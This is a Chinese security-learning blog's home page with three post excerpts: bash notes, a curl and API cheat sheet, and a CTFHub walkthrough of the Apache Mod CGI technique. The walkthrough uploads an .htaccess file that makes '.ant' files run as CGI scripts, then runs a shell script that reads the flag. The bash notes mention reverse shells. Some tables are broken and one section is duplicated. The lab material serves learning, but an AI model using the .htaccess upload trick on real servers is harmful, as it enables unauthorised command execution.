
<!DOCTYPE html>
<html lang="en ">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Salve || </title>
    <meta name="author" content="TiAmo">
    <meta name="description" content="Buona notte ">
    <meta name="keywords" content=" ">
    <link rel="icon" href="/avatar.png">
    <link rel="stylesheet" href="/css/antd.min.css">
    
    <link rel="stylesheet" href="/css/full-theme.css">
    
    <script src="/js/vue.js"></script>
    <script src="/js/antd.min.js"></script>
<meta name="generator" content="Hexo 6.3.0"></head>

<body>

    <div id="loading"
        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
        <div
            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
            <div id="loadcontent"
                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
                <div>
                    <h2>LOADING...</h2>
                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
                    <div>
                        <img src="/dancingkitty.gif" alt="loading">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="layout">
        <transition name="into">
            <div v-show="show_page" style="display: none;">
                <div id="menu_show">
                     
<nav id="menu">
    <div class="desktop-menu">
        <a href="/">
            <span class="title">Salve</span>
        </a>
        
        <a href="/">
            <span>
                <a-icon type="home" theme="filled" />
            </span>
            <span>home</span>
        </a>
        
        <a href="/about">
            <span>
                <a-icon type="idcard" theme="filled" />
            </span>
            <span>about</span>
        </a>
        
        <a href="/archives">
            <span>
                <a-icon type="folder" theme="filled" />
            </span>
            <span>archives</span>
        </a>
        
        <a href="/categories">
            <span>
                <a-icon type="book" theme="filled" />
            </span>
            <span>categories</span>
        </a>
        
        <a href="/tags">
            <span>
                <a-icon type="tags" theme="filled" />
            </span>
            <span>tags</span>
        </a>
        
        <a href="">
            <span>
                <a-icon type="compass" theme="filled" />
            </span>
            <span>英文博客</span>
        </a>
        
    </div>

    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div :class="'title'" @click="menu_show=!menu_show">
            <span style="margin-right: 10px;">
                <a-icon type="appstore" theme="filled" />
            </span>
            <span>Salve</span>
        </div>
        <div class="items" v-show="menu_show">
            
            <a href="/">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="home" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
                </div>
            </a>
            
            <a href="/about">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="idcard" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
                </div>
            </a>
            
            <a href="/archives">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="folder" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
                </div>
            </a>
            
            <a href="/categories">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="book" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
                </div>
            </a>
            
            <a href="/tags">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="tags" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
                </div>
            </a>
            
            <a href="">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="compass" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
                </div>
            </a>
            
        </div>
        <div class="curtain" v-show="menu_show"></div>
    </div>

</nav>
                </div>

                <div id="main">
                    <div id="home-head" style=background-image:url('home.jpg')>
    <script>
        var menu = document.getElementById("menu")
        menu.className += " menu-color"
    </script>
     
    <div id="home-info" class="home-info" @click="home_click">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>Salve</h1>
                <h3></h3>
                <h5>Buona notte</h5>
            </div>
        </span>
    </div>
     
</div>



<div id="home-posts-wrap" class=>
    <div id="home-posts">

        <div id="posts">
            

<div class="post">

    <a href="/2023/06/12/bash/">
        <h2>
            bash
        </h2>
    </a>

    <div class="category-and-date">

        

        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled" />
            </span>
            2023/6/12
        </span>

    </div>

    <div class="excerpt">
        <div class="content" v-pre>
            
            
            <h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><p>###参数变量:</p>
<table>
<thead>
<tr>
<th><code>$#</code></th>
<th>此变量保存传递给脚本的参数数。</th>
</tr>
</thead>
<tbody><tr>
<td><code>$@</code></td>
<td>此变量可用于检索命令行参数列表。</td>
</tr>
<tr>
<td><code>$n</code></td>
<td>可以使用其位置有选择地检索每个命令行参数。例如，第一个参数位于 。<code>$1</code></td>
</tr>
<tr>
<td><code>$$</code></td>
<td>当前正在执行的进程的进程 ID。</td>
</tr>
<tr>
<td><code>$?</code></td>
<td>脚本的退出状态。此变量可用于确定命令是否成功。值 0 表示成功执行，而值 1 表示失败的结果。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th><code>$#</code></th>
<th>在这种情况下，我们只需要一个需要分配给该变量的变量。此变量用于指定我们要使用的目标。如果我们只提供一个 FQDN 作为参数，则该变量的值为 .<code>domain``$#``1</code></th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>此特殊变量被分配执行脚本的名称，然后在 “” 示例中显示。<code>Usage:</code></td>
</tr>
<tr>
<td><code>$1</code></td>
<td>用空格分隔，第一个参数分配给该特殊变量。</td>
</tr>
</tbody></table>
<p>###引号的区别:</p>
<p>在Bash中，<code>&quot;&quot;</code>（双引号）和 <code>&#39;&#39;</code>（单引号）是用于引用字符串的两种不同方式，它们有以下区别：</p>
<ol>
<li>处理变量和命令替换：<ul>
<li><code>&quot;&quot;</code>：双引号允许变量展开（即替换为变量的值）和命令替换（即替换为命令的输出结果）。例如，<code>&quot;$var&quot;</code>将展开为变量<code>var</code>的值。</li>
<li><code>&#39;&#39;</code>：单引号将字符串视为字面值，不进行变量展开或命令替换。例如，<code>&#39;$var&#39;</code>将被视为字面字符串<code>$var</code>，而不是变量展开。</li>
</ul>
</li>
<li>处理特殊字符的转义：<ul>
<li><code>&quot;&quot;</code>：双引号可以使用反斜杠<code>\</code>来转义某些特殊字符，如<code>\&quot;</code>（双引号）、<code>\\</code>（反斜杠）等。这样，特殊字符将被视为普通字符，而不具有其特殊含义。</li>
<li><code>&#39;&#39;</code>：单引号内的字符串将被视为纯文本，不进行特殊字符的转义。即使特殊字符（如反斜杠和双引号）也将被视为字面值。</li>
</ul>
</li>
</ol>
<pre><code>var=&quot;world&quot;

echo &quot;Hello $var&quot;     # 输出：Hello world

echo &#39;Hello var&#39;     # 输出：Hello var

echo &quot;I have $10&quot;    # 输出：I have $10

echo &#39;I have 10&#39;     # 输出：I have 10

echo &quot;Path: $HOME&quot;    # 输出：Path: /home/username

echo &#39;Path: HOME&#39;    # 输出：Path: HOME

echo &quot;Quotes: \&quot;\&#39;&quot;   # 输出：Quotes: &quot;&#39;&quot;

echo &#39;Quotes: &quot;\&#39;\&#39;&#39;&quot; # 输出：Quotes: &quot;\&#39;&quot;
</code></pre>
<p>&#x3D;&#x3D;分配变量时，名称和值之间不得有空格。&#x3D;&#x3D;</p>
<p>需要注意的是，单引号 （…） 和双引号 （ … ） 可防止数组中各个值之间的空格分隔。这意味着&#x3D;&#x3D;单引号和双引号之间的所有空格都将被忽略&#x3D;&#x3D;，并作为分配给数组的单个值进行处理。</p>
<p>###数组：</p>
<p>示例代码 <code>domains=(www.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com www2.inlanefreight.com)</code> 是一种有效的方式来创建名为 <code>domains</code> 的数组，并将指定的字符串元素分配给数组的各个索引位置。</p>
<p>在这个例子中，<code>domains</code> 数组包含了四个元素，分别是 <code>&quot;www.inlanefreight.com&quot;</code>, <code>&quot;ftp.inlanefreight.com&quot;</code>, <code>&quot;vpn.inlanefreight.com&quot;</code>, 和 <code>&quot;www2.inlanefreight.com&quot;</code>。</p>
<p>你可以通过使用索引来访问和操作数组的元素。例如：</p>
<pre><code>echo $&#123;domains[0]&#125;  # 输出：www.inlanefreight.com
echo $&#123;domains[2]&#125;  # 输出：vpn.inlanefreight.com

domains[1]=&quot;newdomain.com&quot;  # 修改索引为1的元素

echo $&#123;domains[@]&#125;  # 输出整个数组内容
</code></pre>
<h3 id="字符串运算符："><a href="#字符串运算符：" class="headerlink" title="字符串运算符："></a>字符串运算符：</h3><table>
<thead>
<tr>
<th><code>==</code></th>
<th>等于</th>
</tr>
</thead>
<tbody><tr>
<td><code>!=</code></td>
<td>不等于</td>
</tr>
<tr>
<td><code>&lt;</code></td>
<td>小于 ASCII 字母顺序</td>
</tr>
<tr>
<td><code>&gt;</code></td>
<td>大于 ASCII 字母顺序</td>
</tr>
<tr>
<td><code>-z</code></td>
<td>如果字符串为空 （null）</td>
</tr>
<tr>
<td><code>-n</code></td>
<td>如果字符串不为空</td>
</tr>
</tbody></table>
<p>这里需要注意的是，我们将给定参数的变量放在双引号中。这告诉 Bash 变量的内容应该作为字符串处理。否则，我们会得到一个错误。</p>
<p>字符串比较运算符 “&#x2F;” 只在双方括号内工作。我们可以在互联网上或通过在终端中使用以下命令找到 ASCII 表。我们稍后看一个例子。<code>&lt;``&gt;``[[ &lt;condition&gt; ]]</code></p>
<h4 id="关于括号"><a href="#关于括号" class="headerlink" title="关于括号"></a>关于括号</h4><p>在 Bash 中，<code>(( ))</code> 是一种用于进行算术运算和数值比较的特殊结构。	</p>
<p>双括号 <code>(( ))</code> 的主要作用是将其内部的内容解释为算术表达式。它可以执行数值的增减操作、比较运算等。</p>
<p>对于 <code>((stat--))</code>，它是一个自减运算的表达式。它将变量 <code>stat</code> 的值减 1，并将结果赋值给 <code>stat</code> 变量本身。</p>
<p>请注意，双括号 <code>(( ))</code> 中的表达式不需要使用 <code>$</code> 符号来引用变量。</p>
<p>以下是一个示例：</p>
<pre><code>stat=5
((stat--))
echo $stat  # 输出: 4
</code></pre>
<p>上述示例中，<code>stat</code> 的初始值为 5。<code>((stat--))</code> 表达式将 <code>stat</code> 的值减 1，结果为 4。然后，使用 <code>echo</code> 打印变量 <code>stat</code> 的值，输出为 4。</p>
<p>双括号 <code>(( ))</code> 还支持其他算术运算，例如加法、乘法、除法等，以及数值比较操作。它提供了更强大的算术操作能力，相比于单括号 <code>[]</code> 或 <code>test</code> 命令更方便和灵活。</p>
<p>在 Bash 中，单括号 <code>[]</code> 是用于条件测试的一种结构。它可以用于判断表达式的真假，并根据结果进行条件判断。</p>
<p>以下是单括号 <code>[]</code> 的几种常见用法：</p>
<ol>
<li><p>条件判断：<code>[ expression ]</code> 或者 <code>test expression</code></p>
<p>单括号中的 <code>expression</code> 是一个条件表达式，可以包含变量、比较运算符、逻辑运算符等。条件表达式的结果为真时，返回状态码 0；为假时，返回非零状态码。</p>
</li>
</ol>
<pre><code>if [ $var -eq 10 ]; then
    echo &quot;Variable is equal to 10&quot;
fi
</code></pre>
<ol start="2">
<li>字符串比较：<code>[ string1 operator string2 ]</code></li>
</ol>
<p>单括号中的字符串比较用于判断两个字符串之间的关系，常见的操作符包括 <code>-eq</code>（相等）、<code>!=</code>（不相等）、<code>-z</code>（为空字符串）、<code>-n</code>（非空字符串）等。</p>
<p>示例：</p>
<pre><code>if [ &quot;$str1&quot; = &quot;$str2&quot; ]; then
    echo &quot;Strings are equal&quot;
fi
</code></pre>
<ol start="3">
<li>文件测试：<code>[ -&lt;option&gt; file ]</code></li>
</ol>
<p>单括号中的文件测试用于检查文件的属性或状态，常见的选项包括 <code>-f</code>（判断是否为常规文件）、<code>-d</code>（判断是否为目录）、<code>-r</code>（判断是否可读）等。</p>
<p>示例：</p>
<pre><code>if [ -f &quot;$filename&quot; ]; then
    echo &quot;File exists and is a regular file&quot;
fi
</code></pre>
<p>需要注意的是，单括号 <code>[]</code> 是一种命令结构，它将条件表达式作为命令的参数。在条件判断中，变量应该使用双引号引起来，以防止由于变量为空或包含空格等特殊字符而引发错误。</p>
<p>另外，与双括号 <code>(( ))</code> 不同，单括号 <code>[]</code> 不支持算术运算，它主要用于条件判断和文件测试。</p>
<h5 id="htb-可以统计字符串字数"><a href="#htb-可以统计字符串字数" class="headerlink" title="${ #htb}可以统计字符串字数"></a>${ #htb}可以统计字符串字数</h5><p>###文件运算符：</p>
<table>
<thead>
<tr>
<th><code>-e</code></th>
<th>如果文件存在</th>
</tr>
</thead>
<tbody><tr>
<td><code>-f</code></td>
<td>测试它是否为文件</td>
</tr>
<tr>
<td><code>-d</code></td>
<td>测试它是否是目录</td>
</tr>
<tr>
<td><code>-L</code></td>
<td>测试是否为符号链接</td>
</tr>
<tr>
<td><code>-N</code></td>
<td>检查文件在上次读取后是否被修改</td>
</tr>
<tr>
<td><code>-O</code></td>
<td>如果当前用户拥有该文件</td>
</tr>
<tr>
<td><code>-G</code></td>
<td>如果文件的组 ID 与当前用户的组 ID 匹配</td>
</tr>
<tr>
<td><code>-s</code></td>
<td>测试文件大小是否大于 0</td>
</tr>
<tr>
<td><code>-r</code></td>
<td>测试文件是否具有读取权限</td>
</tr>
<tr>
<td><code>-w</code></td>
<td>测试文件是否具有写入权限</td>
</tr>
<tr>
<td><code>-x</code></td>
<td>测试文件是否具有执行权限</td>
</tr>
</tbody></table>
<p>示例：查看文件是否存在</p>
<pre><code>#!/bin/bash

# Check if the specified file exists
if [ -e &quot;$1&quot; ]
then
    echo -e &quot;The file exists.&quot;
    exit 0

else
    echo -e &quot;The file does not exist.&quot;
    exit 2
fi
</code></pre>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table>
<thead>
<tr>
<th><code>!</code></th>
<th>逻辑否定不是</th>
</tr>
</thead>
<tbody><tr>
<td><code>&amp;&amp;</code></td>
<td>逻辑和</td>
</tr>
<tr>
<td>&#96;</td>
<td></td>
</tr>
</tbody></table>
<h4 id="关于"><a href="#关于" class="headerlink" title="关于=~"></a>关于<code>=~</code></h4><pre><code>在 Bash 中，`=~` 是一个用于正则表达式匹配的操作符。它用于将一个字符串与一个正则表达式进行匹配。
</code></pre>
<p>语法为：</p>
<pre><code>[[ string =~ regex ]]
</code></pre>
<p>其中 <code>string</code> 是要匹配的字符串，<code>regex</code> 是正则表达式模式。</p>
<p>当使用 <code>=~</code> 进行匹配时，如果 <code>string</code> 符合 <code>regex</code> 的模式，条件将为真；否则，条件将为假。</p>
<p>这个操作符通常用于条件语句，例如 <code>if</code> 语句中，用于检查字符串是否符合特定的正则表达式模式。</p>
<p>以下是一个示例：</p>
<pre><code>string=&quot;Hello, world!&quot;

if [[ $string =~ o,.*ld! ]]; then
    echo &quot;Matched!&quot;
else
    echo &quot;Not matched!&quot;
fi
</code></pre>
<p>上述示例中，如果 <code>string</code> 匹配了模式 <code>o,.*ld!</code>，则条件为真，将输出 “Matched!”。否则，将输出 “Not matched!”。</p>
<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><pre><code>在 Bash 中，文件描述符是用于标识不同类型的输入/输出流的整数。常见的文件描述符有以下几种：
</code></pre>
<ul>
<li>0: 标准输入（stdin）</li>
<li>1: 标准输出（stdout）</li>
<li>2: 标准错误（stderr）</li>
</ul>
<p>使用 <code>&gt;</code> 或 <code>&lt;</code> 进行重定向时，默认情况下会操作标准输出。但是，当使用 <code>&amp;</code> 将数字与 <code>&gt;</code> 或 <code>&lt;</code> 结合使用时，它会告诉 Bash 这是一个文件描述符，而不是普通的输入&#x2F;输出操作符。</p>
<p>因此，<code>2&gt;&amp;1</code> 将标准错误的文件描述符 <code>2</code> 与 <code>&gt;</code> 结合，指示 Bash 将标准错误重定向到其前面的文件描述符 <code>1</code>，即标准输出。</p>
<p>这种语法允许将标准错误输出合并到标准输出中，以便统一处理和重定向这两个流的内容。</p>
<p>在 Bash 中，<code>2&gt;&amp;1</code> 是一种重定向语法，用于将标准错误（标识符为2）重定向到标准输出。</p>
<p>具体来说，<code>2</code> 表示标准错误的文件描述符，<code>1</code> 表示标准输出的文件描述符。<code>&gt;</code> 符号用于将输出重定向到指定的文件描述符。</p>
<p>因此，<code>2&gt;&amp;1</code> 将标准错误重定向到标准输出，意味着标准错误的输出将与标准输出一起显示。</p>
<p>以下是一些示例说明：</p>
<ul>
<li><code>command 2&gt;&amp;1</code>：将 <code>command</code> 命令的标准错误输出合并到标准输出中。</li>
<li><code>command &gt; output.txt 2&gt;&amp;1</code>：将 <code>command</code> 命令的标准输出和标准错误输出都重定向到 <code>output.txt</code> 文件中。</li>
</ul>
<p>这种重定向语法常用于捕获和处理命令的错误消息，以及将标准输出和标准错误输出一起保存到日志文件中。</p>
<p>需要注意的是，<code>2&gt;&amp;1</code> 中的空格很重要，确保它们位于 <code>2</code>、<code>&gt;</code> 和 <code>1</code> 之间，以及 <code>&amp;</code> 符号前后，以正确指定重定向操作。</p>
<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><table>
<thead>
<tr>
<th><code>1</code></th>
<th>一般错误</th>
</tr>
</thead>
<tbody><tr>
<td><code>2</code></td>
<td>滥用外壳内置</td>
</tr>
<tr>
<td><code>126</code></td>
<td>调用的命令无法执行</td>
</tr>
<tr>
<td><code>127</code></td>
<td>找不到命令</td>
</tr>
<tr>
<td><code>128</code></td>
<td>退出的参数无效</td>
</tr>
<tr>
<td><code>128+n</code></td>
<td>致命错误信号”<code>n</code>“</td>
</tr>
<tr>
<td><code>130</code></td>
<td>脚本由 Control-C 终止</td>
</tr>
<tr>
<td><code>255\*</code></td>
<td>退出状态超出范围</td>
</tr>
</tbody></table>
<h4 id="2-gt-amp-1"><a href="#2-gt-amp-1" class="headerlink" title="2&gt;&amp;1"></a>2&gt;&amp;1</h4><p>在 Bash 中，<code>2&gt;&amp;1</code> 是一种重定向语法，用于将标准错误（标识符为2）重定向到标准输出。</p>
<p>具体来说，<code>2</code> 表示标准错误的文件描述符，<code>1</code> 表示标准输出的文件描述符。<code>&gt;</code> 符号用于将输出重定向到指定的文件描述符。</p>
<p>因此，<code>2&gt;&amp;1</code> 将标准错误重定向到标准输出，意味着标准错误的输出将与标准输出一起显示。</p>
<p>以下是一些示例说明：</p>
<ul>
<li><code>command 2&gt;&amp;1</code>：将 <code>command</code> 命令的标准错误输出合并到标准输出中。</li>
<li><code>command &gt; output.txt 2&gt;&amp;1</code>：将 <code>command</code> 命令的标准输出和标准错误输出都重定向到 <code>output.txt</code> 文件中。</li>
</ul>
<p>这种重定向语法常用于捕获和处理命令的错误消息，以及将标准输出和标准错误输出一起保存到日志文件中。</p>
<p>需要注意的是，<code>2&gt;&amp;1</code> 中的空格很重要，确保它们位于 <code>2</code>、<code>&gt;</code> 和 <code>1</code> 之间，以及 <code>&amp;</code> 符号前后，以正确指定重定向操作。</p>
<p>&amp;在这里的含义是什么</p>
<p>ChatGPT</p>
<p>在 <code>2&gt;&amp;1</code> 中，<code>&amp;</code> 的含义是将其前面的数字 <code>2</code> 解释为文件描述符而不是普通的字符。</p>
<p>在 Bash 中，文件描述符是用于标识不同类型的输入&#x2F;输出流的整数。常见的文件描述符有以下几种：</p>
<ul>
<li>0: 标准输入（stdin）</li>
<li>1: 标准输出（stdout）</li>
<li>2: 标准错误（stderr）</li>
</ul>
<p>使用 <code>&gt;</code> 或 <code>&lt;</code> 进行重定向时，默认情况下会操作标准输出。但是，当使用 <code>&amp;</code> 将数字与 <code>&gt;</code> 或 <code>&lt;</code> 结合使用时，它会告诉 Bash 这是一个文件描述符，而不是普通的输入&#x2F;输出操作符。</p>
<p>因此，<code>2&gt;&amp;1</code> 将标准错误的文件描述符 <code>2</code> 与 <code>&gt;</code> 结合，指示 Bash 将标准错误重定向到其前面的文件描述符 <code>1</code>，即标准输出。</p>
<p>这种语法允许将标准错误输出合并到标准输出中，以便统一处理和重定向这两个流的内容。</p>
<p>这在我们反弹shell的时候会用到。</p>

            
        </div>
    </div>

    <div class="post-tags">
        
        <span class="icon">
            <a-icon type="tags" theme="filled" />
        </span>
        
        
        <span class="tag">
            
            <a href="/tags/base" style=color:#ff7d73>
                base
            </a>
        </span>
        
    </div>

    <a href="/2023/06/12/bash/ " class="go-post">
        阅读全文
    </a>
</div>

<div class="post">

    <a href="/2023/06/11/Apache Mod CGI/">
        <h2>
            Apache Mod CGI
        </h2>
    </a>

    <div class="category-and-date">

        

        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled" />
            </span>
            2023/6/11
        </span>

    </div>

    <div class="excerpt">
        <div class="content" v-pre>
            
            
            <h1 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h1><h4 id="知识储备："><a href="#知识储备：" class="headerlink" title="知识储备："></a>知识储备：</h4><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62078839/article/details/125691017?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167152297616800182178110%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167152297616800182178110&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-125691017-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=%20Apache%20Mod%20CGI&spm=1018.2226.3001.4187">CTFHUB-Apache Mod CGI(PHP学习)</a></p>
<p><strong>原理简述</strong></p>
<blockquote>
<p>早期的Web服务器，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。随着Web技术的发展，逐渐出现了动态技术，但是Web服务器并不能够直接运行动态脚本，为了解决Web服务器与外部应用程序（CGI程序）之间数据互通，于是出现了CGI（Common Gateway Interface）通用网关接口。简单理解，可以认为CGI是Web服务器和运行其上的应用程序进行“交流”的一种约定。</p>
<p>当遇到动态脚本请求时，Web服务器主进程就会<code>Fork</code>创建出一个新的进程来启动CGI程序，运行外部C程序或Perl、PHP脚本等，也就是将动态脚本交给CGI程序来处理。这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。</p>
<p>而对于Mod CGI，Web服务器可以内置Perl解释器或PHP解释器。也就是说将这些解释器做成模块的方式，Web服务器会在启动的时候就启动这些解释器。当有新的动态请求进来时，Web服务器就是&#x3D;&#x3D;自己解析这些动态脚本&#x3D;&#x3D;，省得重新Fork一个进程，效率提高了。<br>​	</p>
</blockquote>
<p><strong>使用条件：</strong></p>
<blockquote>
<ul>
<li>Linux 操作系统 Apache + PHP (apache 使用 apache_mod_php) Apache 开启了<code>cgi</code>、<code>rewrite</code></li>
<li>Web 目录给了<code>AllowOverride</code>权限</li>
<li>当前目录可写</li>
</ul>
</blockquote>
<p><strong>AllowOverride</strong></p>
<blockquote>
<p>在 AllowOverride 设置为 None 时， .htaccess 文件将被完全忽略。当此指令设置为 All 时，所有具有 “.htaccess” <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E4%BD%9C%E7%94%A8%E5%9F%9F&spm=1001.2101.3001.7020">作用域</a>的指令都允许出现在 .htaccess 文件中。</p>
</blockquote>
<h2 id="实战：ctfhub"><a href="#实战：ctfhub" class="headerlink" title="实战：ctfhub"></a>实战：ctfhub</h2><p>先上传一个.htaccess文件让系统把我们上传的<code>ant</code>文件当作CGI文件：</p>
<pre><code>Options +ExecCGI
AddHandler cgi-script .ant
</code></pre>
<p>然后上传一个<code>.ant</code>文件：</p>
<pre><code>#!/bin/sh
echo&amp;&amp;tac /flag;
</code></pre>
<p>这里有个疑问：必须使用 &amp;&amp; 连接符后才能正确返回，否则网页报错。</p>

            
        </div>
    </div>

    <div class="post-tags">
        
        <span class="icon">
            <a-icon type="tags" theme="filled" />
        </span>
        
        
        <span class="tag">
            
            <a href="/tags/靶场学习" style=color:#ffa2c4>
                靶场学习
            </a>
        </span>
        
    </div>

    <a href="/2023/06/11/Apache Mod CGI/ " class="go-post">
        阅读全文
    </a>
</div>

<div class="post">

    <a href="/2023/06/11/chat_sheet/">
        <h2>
            备忘录
        </h2>
    </a>

    <div class="category-and-date">

        

        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled" />
            </span>
            2023/6/11
        </span>

    </div>

    <div class="excerpt">
        <div class="content" v-pre>
            
            
            <h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h2><table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>curl -h</code></td>
<td>cURL help menu</td>
</tr>
<tr>
<td><code>curl inlanefreight.com</code></td>
<td>Basic GET request</td>
</tr>
<tr>
<td><code>curl -s -O inlanefreight.com/index.html</code></td>
<td>Download file</td>
</tr>
<tr>
<td><code>curl -k https://inlanefreight.com</code></td>
<td>Skip HTTPS (SSL) certificate validation</td>
</tr>
<tr>
<td><code>curl inlanefreight.com -v</code></td>
<td>Print full HTTP request&#x2F;response details</td>
</tr>
<tr>
<td><code>curl -I https://www.inlanefreight.com</code></td>
<td>Send HEAD request (only prints response headers)</td>
</tr>
<tr>
<td><code>curl -i https://www.inlanefreight.com</code></td>
<td>Print response headers and response body</td>
</tr>
<tr>
<td><code>curl https://www.inlanefreight.com -A &#39;Mozilla/5.0&#39;</code></td>
<td>Set User-Agent header</td>
</tr>
<tr>
<td><code>curl -u admin:admin http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
<td>Set HTTP basic authorization credentials</td>
</tr>
<tr>
<td><code>curl http://admin:admin@&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
<td>Pass HTTP basic authorization credentials in the URL</td>
</tr>
<tr>
<td><code>curl -H &#39;Authorization: Basic YWRtaW46YWRtaW4=&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
<td>Set request header</td>
</tr>
<tr>
<td><code>curl &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php?search=le&#39;</code></td>
<td>Pass GET parameters</td>
</tr>
<tr>
<td><code>curl -X POST -d &#39;username=admin&amp;password=admin&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
<td>Send POST request with POST data</td>
</tr>
<tr>
<td><code>curl -b &#39;PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
<td>Set request cookies</td>
</tr>
<tr>
<td><code>curl -X POST -d &#39;&#123;&quot;search&quot;:&quot;london&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php</code></td>
<td>Send POST request with JSON data</td>
</tr>
</tbody></table>
<h2 id="APIs"><a href="#APIs" class="headerlink" title="APIs"></a>APIs</h2><table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london</code></td>
<td>Read entry</td>
</tr>
<tr>
<td>&#96;curl -s http:&#x2F;&#x2F;<SERVER_IP>:<PORT>&#x2F;api.php&#x2F;city&#x2F;</td>
<td>jq&#96;</td>
</tr>
<tr>
<td><code>curl -X POST http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/ -d &#39;&#123;&quot;city_name&quot;:&quot;HTB_City&quot;, &quot;country_name&quot;:&quot;HTB&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39;</code></td>
<td>Create (add) entry</td>
</tr>
<tr>
<td><code>curl -X PUT http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london -d &#39;&#123;&quot;city_name&quot;:&quot;New_HTB_City&quot;, &quot;country_name&quot;:&quot;HTB&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39;</code></td>
<td>Update (modify) entry</td>
</tr>
<tr>
<td><code>curl -X DELETE http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/New_HTB_City</code></td>
<td>Delete entry</td>
</tr>
</tbody></table>
<h2 id="Browser-DevTools"><a href="#Browser-DevTools" class="headerlink" title="Browser DevTools"></a>Browser DevTools</h2><table>
<thead>
<tr>
<th><strong>Shortcut</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>[<code>CTRL+SHIFT+I</code>] or [<code>F12</code>]</td>
<td>Show devtools</td>
</tr>
<tr>
<td>[<code>CTRL+SHIFT+E</code>]</td>
<td>Show Network tab</td>
</tr>
<tr>
<td>[<code>CTRL+SHIFT+K</code>]</td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th><code>curl http:/SERVER_IP:PORT/</code></th>
<th>cURL 获取请求</th>
</tr>
</thead>
<tbody><tr>
<td><code>curl -s http:/SERVER_IP:PORT/ -X POST</code></td>
<td>cURL 发布请求</td>
</tr>
<tr>
<td><code>curl -s http:/SERVER_IP:PORT/ -X POST -d &quot;param1=sample&quot;</code></td>
<td>包含数据的网址 POST 请求</td>
</tr>
<tr>
<td>&#96;echo hackthebox</td>
